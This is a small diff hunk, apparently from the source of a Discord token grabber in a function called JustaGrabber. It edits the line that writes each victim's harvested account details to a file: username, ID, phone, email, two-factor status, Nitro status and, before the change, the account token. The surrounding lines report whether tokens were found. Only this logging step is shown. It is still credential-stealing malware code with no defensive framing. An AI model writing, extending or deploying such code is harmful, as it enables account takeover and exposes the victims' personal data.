@@ -138,7 +138,7 @@ def JustaGrabber():
                         reee = False
                         if 'premium_type' in r.json():
                             reee = True
-                        file.write(f"\n====================\nToken : {token}\nUsername : {userName}\nUser ID : {userID}\nPhone : {phone}\nEmail : {email}\nVerified : {fff}\n2 Factor login enabled : {mfa}\nNSFW allowed : {f}\nLanguage : {ff}\nFlags : {ffff}\nNitro : {reee}\n====================\n")
+                        file.write(f"\n--------------------\nUsername : {userName}\nUser ID : {userID}\nPhone : {phone}\nEmail : {email}\nVerified : {fff}\n2 Factor login enabled : {mfa}\nNSFW allowed : {f}\nLanguage : {ff}\nFlags : {ffff}\nNitro : {reee}\n--------------------\n")
 
         else: # Print when no tokens found.
             message += '[Error](No tokens found.)\n'
